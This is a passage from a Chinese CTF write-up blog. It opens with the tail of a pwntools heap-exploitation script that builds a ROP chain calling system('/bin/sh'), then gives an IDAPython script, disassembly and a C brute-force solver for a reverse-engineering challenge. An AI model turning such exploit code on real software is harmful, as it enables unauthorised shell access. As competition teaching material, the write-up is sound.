tmp <span class="token operator">=</span> <span class="token punctuation">(</span>heap_base<span class="token operator">>></span><span class="token number">12</span><span class="token punctuation">)</span><span class="token operator">^</span><span class="token punctuation">(</span>stack<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>heap_base<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>tmp<span class="token punctuation">)</span><span class="token punctuation">)</span>
tmp_low <span class="token operator">=</span> tmp <span class="token operator">&amp;</span> <span class="token number">0xffffffff</span>
tmp_high <span class="token operator">=</span> <span class="token punctuation">(</span>tmp <span class="token operator">&amp;</span> <span class="token number">0xffff00000000</span><span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">0x20</span>

edit<span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0xa1</span><span class="token punctuation">)</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0xa1</span><span class="token punctuation">)</span><span class="token operator">+</span>p16<span class="token punctuation">(</span><span class="token number">0xc480</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    pl <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0x31</span><span class="token punctuation">)</span> <span class="token operator">+</span> p16<span class="token punctuation">(</span><span class="token number">0xc490</span><span class="token operator">+</span>i<span class="token operator">*</span><span class="token number">0x30</span><span class="token punctuation">)</span>
    edit<span class="token punctuation">(</span><span class="token number">0x30</span><span class="token operator">-</span>i<span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0x31</span><span class="token punctuation">)</span><span class="token punctuation">,</span>pl<span class="token punctuation">)</span>
    edit<span class="token punctuation">(</span><span class="token number">0xa</span><span class="token operator">+</span>i<span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0x31</span><span class="token punctuation">)</span><span class="token operator">+</span>p16<span class="token punctuation">(</span><span class="token number">0x32</span><span class="token operator">+</span>i<span class="token punctuation">)</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0x31</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    delete<span class="token punctuation">(</span><span class="token number">0x32</span><span class="token operator">+</span>i<span class="token punctuation">)</span>

pl <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0x31</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>tmp_low<span class="token punctuation">)</span> <span class="token operator">+</span> p16<span class="token punctuation">(</span>tmp_high<span class="token punctuation">)</span>
edit<span class="token punctuation">(</span><span class="token number">0xb</span><span class="token punctuation">,</span>pl<span class="token punctuation">,</span>p64<span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">)</span>

edit<span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0xa1</span><span class="token punctuation">)</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0xa1</span><span class="token punctuation">)</span><span class="token operator">+</span>p16<span class="token punctuation">(</span><span class="token number">0xc260</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span>p64<span class="token punctuation">(</span><span class="token number">0x31</span><span class="token punctuation">)</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0x31</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
edit<span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0xa1</span><span class="token punctuation">)</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0xa1</span><span class="token punctuation">)</span><span class="token operator">+</span>p16<span class="token punctuation">(</span><span class="token number">0xcd70</span><span class="token punctuation">)</span><span class="token punctuation">)</span>


pop_rdi <span class="token operator">=</span> libc<span class="token punctuation">.</span>address <span class="token operator">+</span> <span class="token number">0x000000000002a3e5</span>
binsh <span class="token operator">=</span> <span class="token builtin">next</span><span class="token punctuation">(</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">b'/bin/sh\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
system <span class="token operator">=</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>
rdi <span class="token operator">=</span> stack <span class="token operator">-</span> <span class="token punctuation">(</span><span class="token number">0x7fffffffdc40</span><span class="token operator">-</span><span class="token number">0x7ffff7faea70</span><span class="token punctuation">)</span>
ret <span class="token operator">=</span> libc<span class="token punctuation">.</span>address <span class="token operator">+</span> <span class="token number">0x0000000000029cd6</span>
ret_0x10 <span class="token operator">=</span> libc<span class="token punctuation">.</span>address <span class="token operator">+</span> <span class="token number">0x00000000000c164e</span>

<span class="token comment"># print(hex(pop_rdi))</span>
gad <span class="token operator">=</span> libc<span class="token punctuation">.</span>address <span class="token operator">+</span> <span class="token number">0x0000000000125bae</span> <span class="token operator">+</span> <span class="token number">2</span>
tmp <span class="token operator">=</span> system
tmp_low <span class="token operator">=</span> tmp <span class="token operator">&amp;</span> <span class="token number">0xffffffff</span>
tmp_high <span class="token operator">=</span> <span class="token punctuation">(</span>tmp <span class="token operator">&amp;</span> <span class="token number">0xffff00000000</span><span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">0x20</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>tmp_high<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>tmp_low<span class="token punctuation">)</span><span class="token punctuation">)</span>

pl <span class="token operator">=</span> p64<span class="token punctuation">(</span>gad<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>tmp_low<span class="token punctuation">)</span> <span class="token operator">+</span> p16<span class="token punctuation">(</span>tmp_high<span class="token punctuation">)</span>
add<span class="token punctuation">(</span>pl<span class="token punctuation">,</span>p64<span class="token punctuation">(</span>binsh<span class="token punctuation">)</span><span class="token punctuation">)</span>

p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h1 id="re"><a href="#re" class="headerlink" title="re"></a>re</h1><h2 id="longlongcall"><a href="#longlongcall" class="headerlink" title="longlongcall"></a>longlongcall</h2><p>确实是longlongcall，每个Instruction被拆分开来，插入到自定义的函数中组成一个很长的调用链，导致静态分析非常麻烦，动态调试也很麻烦，那有没有更简单的方法呢？</p>
<pre class="line-numbers language-none"><code class="language-none">text:0000000000001C3A                               main proc near                          ; DATA XREF: start+18↑o
.text:0000000000001C3A                               ; __unwind &#123;
.text:0000000000001C3A 55                            push    rbp
.text:0000000000001C3B 9C                            pushfq
.text:0000000000001C3C E8 02 00 00 00                call    sub_1C43
.text:0000000000001C3C
.text:0000000000001C41 C9                            leave
.text:0000000000001C42 C3                            retn
.text:0000000000001C42
.text:0000000000001C42                               main endp
.text:0000000000001C42
.text:0000000000001C43
.text:0000000000001C43                               ; &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; S U B R O U T I N E &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;
.text:0000000000001C43
.text:0000000000001C43
.text:0000000000001C43                               ; __int64 __fastcall sub_1C43(_QWORD, _QWORD, _QWORD)
.text:0000000000001C43                               sub_1C43 proc near                      ; CODE XREF: main+2↑p
.text:0000000000001C43 48 83 C4 08                   add     rsp, 8
.text:0000000000001C47 9D                            popfq
.text:0000000000001C48 48 89 E5                      mov     rbp, rsp
.text:0000000000001C4B 9C                            pushfq
.text:0000000000001C4C E8 02 00 00 00                call    sub_1C53
.text:0000000000001C4C
.text:0000000000001C51 C9                            leave
.text:0000000000001C52 C3                            retn
.text:0000000000001C52
.text:0000000000001C52                               sub_1C43 endp ; sp-analysis failed
.text:0000000000001C52
.text:0000000000001C53
.text:0000000000001C53                               ; &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; S U B R O U T I N E &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;
.text:0000000000001C53
.text:0000000000001C53
.text:0000000000001C53                               sub_1C53 proc near                      ; CODE XREF: sub_1C43+9↑p
.text:0000000000001C53 48 83 C4 08                   add     rsp, 8
.text:0000000000001C57 9D                            popfq
.text:0000000000001C58 48 83 EC 40                   sub     rsp, 40h
.text:0000000000001C5C 9C                            pushfq
.text:0000000000001C5D E8 02 00 00 00                call    sub_1C64<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>最近学习到了一些ida python的用法，发现可以使用ida python内置的接口去解决这个问题，使用的是ida 7.7。可以分析出每个子函数内只有一条指令是有用的，其他逻辑都是调整栈帧还有函数调用的逻辑，那 只需要条件递归 main函数，跳过无用的逻辑(pushfq popfq leave retn等)，将有用的逻辑取出来并disasm 就能解决这个longlongcall了。不过还发现一个问题，程序除了call之外，还使用jmp之类的jcc指令跳转到新的代码块中，然后程序中的循环也是使用jcc去实现的，如果条件递归中，除了call 还加上这些jcc去递归，那很容易因为循环逻辑陷入一个无限递归，所以只能去递归call，把不属于迭代数据循环的jcc指令跑多几遍。</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> idaapi
<span class="token keyword">import</span> idautils
<span class="token keyword">import</span> idc

start_addr <span class="token operator">=</span> <span class="token number">0x1c3a</span>
visited <span class="token operator">=</span> <span class="token builtin">set</span><span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">analyze_function_calls</span><span class="token punctuation">(</span>addr<span class="token punctuation">,</span> depth<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> addr <span class="token keyword">in</span> visited<span class="token punctuation">:</span>
        <span class="token keyword">return</span>

    visited<span class="token punctuation">.</span>add<span class="token punctuation">(</span>addr<span class="token punctuation">)</span>

    function_name <span class="token operator">=</span> idc<span class="token punctuation">.</span>get_func_name<span class="token punctuation">(</span>addr<span class="token punctuation">)</span>
    <span class="token keyword">if</span> <span class="token keyword">not</span> function_name<span class="token punctuation">:</span>
        function_name <span class="token operator">=</span> <span class="token string">"sub_%X"</span> <span class="token operator">%</span> addr

    <span class="token keyword">for</span> instruction <span class="token keyword">in</span> idautils<span class="token punctuation">.</span>FuncItems<span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment"># 遍历函数里的每一条 Instruction</span>
        mnem <span class="token operator">=</span> idc<span class="token punctuation">.</span>print_insn_mnem<span class="token punctuation">(</span>instruction<span class="token punctuation">)</span>
        <span class="token comment"># if mnem == "call" or mnem.startswith("j"):  # 如果 Instruction 为 call 或以 j 开头(jcc)</span>
        <span class="token keyword">if</span> mnem <span class="token operator">==</span> <span class="token string">"call"</span><span class="token punctuation">:</span>  <span class="token comment"># 如果 Instruction 为 call</span>
            call_addr <span class="token operator">=</span> idc<span class="token punctuation">.</span>get_operand_value<span class="token punctuation">(</span>instruction<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>  <span class="token comment"># 获取调用地址</span>
            <span class="token keyword">if</span> call_addr <span class="token keyword">not</span> <span class="token keyword">in</span> visited<span class="token punctuation">:</span>
                analyze_function_calls<span class="token punctuation">(</span>call_addr<span class="token punctuation">,</span> depth <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            disasm <span class="token operator">=</span> idc<span class="token punctuation">.</span>GetDisasm<span class="token punctuation">(</span>instruction<span class="token punctuation">)</span>
            <span class="token keyword">if</span> <span class="token keyword">not</span> <span class="token builtin">any</span><span class="token punctuation">(</span>x <span class="token keyword">in</span> disasm <span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token string">"add     rsp, 8"</span><span class="token punctuation">,</span> <span class="token string">"leave"</span><span class="token punctuation">,</span> <span class="token string">"ret"</span><span class="token punctuation">,</span> <span class="token string">"retn"</span><span class="token punctuation">,</span> <span class="token string">"fq"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
                <span class="token keyword">print</span><span class="token punctuation">(</span>disasm<span class="token punctuation">)</span>

<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"------start------"</span><span class="token punctuation">)</span>

analyze_function_calls<span class="token punctuation">(</span>start_addr<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>最后再手工修复一下得到的结果是这样的，逻辑非常清晰，可以看出程序分为三个部分，输入字符串，加密输入的字符串，然后和0x4080的enc flag做比较，只需要关注加密字符串的逻辑就好了</p>
<pre class="line-numbers language-none"><code class="language-none">push    rbp
mov     rbp, rsp
sub     rsp, 40h
mov     rax, fs:28h
mov     [rbp-8], rax
xor     eax, eax
lea     rax, aInputYourFlag; &quot;input your flag:&quot;
mov     rdi, rax
jmp     cs:off_4008 &#x2F;&#x2F; puts_got
lea     rax, [rbp-40h]
mov     rsi, rax
lea     rax, a44s; &quot;%44s&quot;
mov     rdi, rax
mov     eax, 0
jmp     cs:off_4030 &#x2F;&#x2F; scanf_gots
lea     rax, aOkLetSGo; &quot;ok, let&#39;s go&quot;
mov     rdi, rax
lea     rax, [rbp-40h]
mov     rdi, rax
leave
ret

push    rbp
mov     rbp, rsp
sub     rsp, 0F0h
mov     [rbp-0E8h], rdi
mov     rax, fs:28h
mov     [rbp-8], rax
xor     eax, eax
mov     dword ptr [rbp-0D4h], 0
cmp     dword ptr [rbp-0D4h], 2Bh ; &#39;+&#39;
jle     loc_1684
nop
mov     rax, [rbp-8]
sub     rax, fs:28h
jmp     cs:off_4018 
mov     eax, [rbp-0D4h]
movsxd  rdx, eax
mov     rax, [rbp-0E8h]
add     rax, rdx
movzx   ecx, byte ptr [rax]
mov     eax, [rbp-0D4h]
cdqe
lea     rdx, [rax+1]
mov     rax, [rbp-0E8h]
add     rax, rdx
movzx   eax, byte ptr [rax]
add     eax, ecx
mov     [rbp-0D5h], al
mov     eax, [rbp-0D4h]
movsxd  rdx, eax
mov     rax, [rbp-0E8h]
add     rax, rdx
movzx   eax, byte ptr [rax]
mov     edx, [rbp-0D4h]
movsxd  rcx, edx
mov     rdx, [rbp-0E8h]
add     rdx, rcx
xor     al, [rbp-0D5h]
mov     [rdx], al
mov     eax, [rbp-0D4h]
cdqe
lea     rdx, [rax+1]
mov     rax, [rbp-0E8h]
add     rax, rdx
movzx   eax, byte ptr [rax]
mov     edx, [rbp-0D4h]
movsxd  rdx, edx
lea     rcx, [rdx+1]
mov     rdx, [rbp-0E8h]
add     rdx, rcx
xor     al, [rbp-0D5h]
mov     [rdx], al
add     dword ptr [rbp-0D4h], 2
cmp     dword ptr [rbp-0D4h], 2Bh ; &#39;+&#39;
jle     loc_1684
mov     eax, [rbp-0D4h]
lea     rax, [rbp-40h]
mov     rdi, rax
leave
ret



push    rbp
mov     rbp, rsp
sub     rsp, 0F0h
mov     [rbp-0E8h], rdi
mov     rax, fs:28h
mov     [rbp-8], rax
xor     eax, eax
mov     dword ptr [rbp-0D4h], 0
cmp     dword ptr [rbp-0D4h], 2Bh ; &#39;+&#39;
jle     loc_1A30
lea     rax, aRight; &quot;Right&quot;
mov     rdi, rax
jmp     cs:off_4008 &#x2F;&#x2F; puts_got
mov     edi, 0
jmp     cs:off_4040 &#x2F;&#x2F; strlen_got
lea     rax, aChecking; &quot;checking...&quot;
mov     rdi, rax
mov     eax, [rbp-0D4h]
add     eax, eax
mov     edi, eax
jmp     cs:off_4048 &#x2F;&#x2F; sleep_got
mov     eax, [rbp-0D4h]
movsxd  rdx, eax
mov     rax, [rbp-0E8h]
add     rax, rdx
movzx   edx, byte ptr [rax]
mov     eax, [rbp-0D4h]
cdqe
lea     rcx, unk_4080 &#x2F;&#x2F; enc_flag
movzx   eax, byte ptr [rax+rcx]
cmp     dl, al
jz      short loc_1BB2
lea     rax, aWrong; &quot;Wrong!&quot;
mov     rdi, rax
mov     edi, 1
add     dword ptr [rbp-0D4h], 1
cmp     dword ptr [rbp-0D4h], 2Bh ; &#39;+&#39;
jle     loc_1A30
lea     rax, aChecking; &quot;checking...&quot;
mov     eax, 0
mov     rdx, [rbp-8]
sub     rdx, fs:28h
jmp     cs:off_4018 &#x2F;&#x2F; exit_got
leave
ret<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>这一部分是加密输入字符串的逻辑</p>
<pre class="line-numbers language-none"><code class="language-none">push    rbp
mov     rbp, rsp
sub     rsp, 0F0h
mov     [rbp-0E8h], rdi           
mov     rax, fs:28h
mov     [rbp-8], rax
xor     eax, eax
mov     dword ptr [rbp-0D4h], 0
cmp     dword ptr [rbp-0D4h], 2Bh  &#x2F;&#x2F; for(int i&#x3D;0; i&lt;&#x3D; 0x43; i++)&#123;&#125;
jle     loc_1684
nop
mov     rax, [rbp-8]
sub     rax, fs:28h
jmp     cs:off_4018 &#x2F;&#x2F; __stack_chk_fail

loc_1684:
mov     eax, [rbp-0D4h]            
movsxd  rdx, eax                   &#x2F;&#x2F; rdx &#x3D; (int64_t)i
mov     rax, [rbp-0E8h]            
add     rax, rdx                   &#x2F;&#x2F; rax &#x3D; inputstringAddr + i
movzx   ecx, byte ptr [rax]        &#x2F;&#x2F; ecx &#x3D; inputstring[i]
mov     eax, [rbp-0D4h]            &#x2F;&#x2F; eax &#x3D; i
cdqe
lea     rdx, [rax+1]               &#x2F;&#x2F; rdx &#x3D; i + 1
mov     rax, [rbp-0E8h]           
add     rax, rdx                   &#x2F;&#x2F; rax &#x3D; inputstringAddr + i + 1
movzx   eax, byte ptr [rax]        &#x2F;&#x2F; eax &#x3D; inputstring[i + 1]
add     eax, ecx                   &#x2F;&#x2F; eax &#x3D; inputstring[i + 1] + inputstring[i]
mov     [rbp-0D5h], al             &#x2F;&#x2F; save in [rbp-0D5h]
mov     eax, [rbp-0D4h]            &#x2F;&#x2F; eax &#x3D; i
movsxd  rdx, eax                   &#x2F;&#x2F; rdx &#x3D; (int64_t)eax
mov     rax, [rbp-0E8h]
add     rax, rdx                   &#x2F;&#x2F; rax &#x3D; inputstringAddr + i
movzx   eax, byte ptr [rax]        &#x2F;&#x2F; eax &#x3D; inputstring[i]
mov     edx, [rbp-0D4h]            &#x2F;&#x2F; edx &#x3D; i
movsxd  rcx, edx                   &#x2F;&#x2F; rcx &#x3D; (int64_t)edx
mov     rdx, [rbp-0E8h]            &#x2F;&#x2F; rdx &#x3D; inputstringAddr
add     rdx, rcx                   &#x2F;&#x2F; rdx &#x3D; inputstringAddr + i
xor     al, [rbp-0D5h]             &#x2F;&#x2F; eax &#x3D; inputstring[i] ^ [rbp-0D5h]
mov     [rdx], al                  &#x2F;&#x2F; save in inputstring[i]
mov     eax, [rbp-0D4h]            &#x2F;&#x2F; eax &#x3D; i
cdqe
lea     rdx, [rax+1]               &#x2F;&#x2F; rdx &#x3D; i + 1
mov     rax, [rbp-0E8h]            &#x2F;&#x2F; rax &#x3D; inputstringAddr
add     rax, rdx                   &#x2F;&#x2F; rax &#x3D; inputstringAddr + i + 1
movzx   eax, byte ptr [rax]        &#x2F;&#x2F; eax &#x3D; inputstring[i + 1]
mov     edx, [rbp-0D4h]            &#x2F;&#x2F; edx &#x3D; i
movsxd  rdx, edx                   &#x2F;&#x2F; rdx &#x3D; (int64_t)edx
lea     rcx, [rdx+1]               &#x2F;&#x2F; rcx &#x3D; i + 1
mov     rdx, [rbp-0E8h]            &#x2F;&#x2F; rdx &#x3D; inputstringAddr
add     rdx, rcx                   &#x2F;&#x2F; rdx &#x3D; inputstringAddr + i + 1
xor     al, [rbp-0D5h]             &#x2F;&#x2F; eax &#x3D; inputstring[i + 1] ^ [rbp-0D5h]
mov     [rdx], al                  &#x2F;&#x2F; save in inputstring[i + 1]
add     dword ptr [rbp-0D4h], 2    &#x2F;&#x2F; i +&#x3D; 2
cmp     dword ptr [rbp-0D4h], 2Bh  &#x2F;&#x2F; 比较 i 是否小于等于 43
jle     loc_1684
mov     eax, [rbp-0D4h]
lea     rax, [rbp-40h]
mov     rdi, rax
leave
ret<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>尝试写了一下，大概是这样一个结构，其实就是一个约束求解，爆破一下就好了</p>
<pre class="line-numbers language-none"><code class="language-none">void enc(char* input) &#123;
    int i &#x3D; 0;
    char temp;

    while (i &lt;&#x3D; 0x43) &#123;  
        temp &#x3D; input[i + 1] + input[i];   
        input[i] ^&#x3D; temp;
        input[i + 1] ^&#x3D; temp;
        i +&#x3D; 2;
    &#125;
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>exp</p>
<pre class="line-numbers language-none"><code class="language-none">#include &lt;stdio.h&gt;
#include &lt;string.h&gt;

#define FLAG_LENGTH 44

unsigned char data[] &#x3D; &#123;
    0xBB, 0xBF, 0xB9, 0xBE, 0xC3, 0xCC, 0xCE, 0xDC, 0x9E, 0x8F,
    0x9D, 0x9B, 0xA7, 0x8C, 0xD7, 0x95, 0xB0, 0xAD, 0xBD, 0xB4,
    0x88, 0xAF, 0x92, 0xD0, 0xCF, 0xA1, 0xA3, 0x92, 0xB7, 0xB4,
    0xC9, 0x9E, 0x94, 0xA7, 0xAE, 0xF0, 0xA1, 0x99, 0xC0, 0xE3,
    0xB4, 0xB4, 0xBF, 0xE3
&#125;;
 

int main() &#123;

    char flag[FLAG_LENGTH + 1] &#x3D; &#123; 0 &#125;;

    for (int i &#x3D; 0; i &lt; FLAG_LENGTH; i +&#x3D; 2) &#123;
        for (int ch1 &#x3D; 0; ch1 &lt; 256; ++ch1) &#123;
            for (int ch2 &#x3D; 0; ch2 &lt; 256; ++ch2) &#123;
                if ((ch1 ^ (ch1 + ch2)) &#x3D;&#x3D; data[i] &amp;&amp; (ch2 ^ (ch1 + ch2)) &#x3D;&#x3D; data[i + 1]) &#123;
                    flag[i] &#x3D; ch1;
                    flag[i + 1] &#x3D; ch2;
                    break;
                &#125;
            &#125;
        &#125;
    &#125;

    printf(&quot;Flag: %s\n&quot;, flag);

    return 0;
&#125;
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>


	  <div class="article-footer-copyright">
	Ciallo～(∠・ω< )⌒★
</div>

	</div>

	
	
	<div>
  	<center>

	<div class="pagination">

    
    
    <a href="/2024/05/15/hnctf-pwn/" type="button" class="btn btn-default"><i
                class="fa fa-arrow-circle-o-left"></i> Prev</a>
    

    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
    
    <a href="/2024/04/28/中国海洋大学信息安全竞赛pwn方向wp/" type="button" class="btn btn-default ">Next<i
                class="fa fa-arrow-circle-o-right"></i></a>
    

    
</div>


    </center>
	</div>
	
	<!-- comment -->
	<!--
<section id="comment">
    <h2 class="title">Comments</h2>

    
</section>

-->
	
	
	
	</div> <!-- col-md-9/col-md-12 -->


	
	<div id="side_meta">
		<div class="col-md-3" id="post_meta"> 

	<!-- date -->
	
	<div class="meta-widget">
	<i class="fa fa-clock-o"></i>
	2024-05-14 
	</div>
	

	<!-- categories -->
    
	<div class="meta-widget">
	<a data-toggle="collapse" data-target="#categorys"><i class="fa fa-folder"></i></a>	
    <ul id="categorys" class="tag_box list-unstyled collapse in">
          
  <li>
    <li><a href="/categories/ctf/">ctf<span>52</span></a></li>
  </li>

    </ul>
	</div>
	

	<!-- tags -->
	
	<div class="meta-widget">
	<a data-toggle="collapse" data-target="#tags"><i class="fa fa-tags"></i></a>		  
    <ul id="tags" class="tag_box list-unstyled collapse in">	  
	    
  <li><a href="/tags/ctf-writeup/">ctf writeup<span>52</span></a></li>
    </ul>
	</div>
		

	<!-- toc -->
	<div class="meta-widget">
	
	   <a data-toggle="collapse" data-target="#toc"><i class="fa fa-bars"></i></a>
	   <div id="toc" class="toc collapse in">
		   <span class="toc-title">Contents</span>
			<ol class="toc-article"><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#pwn"><span class="toc-article-text">pwn</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#ottoshop"><span class="toc-article-text">ottoshop</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#game"><span class="toc-article-text">game</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Easyvm2024"><span class="toc-article-text">Easyvm2024</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#2bytes"><span class="toc-article-text">2bytes</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#PhoneBook"><span class="toc-article-text">PhoneBook</span></a></li></ol></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#re"><span class="toc-article-text">re</span></a><ol 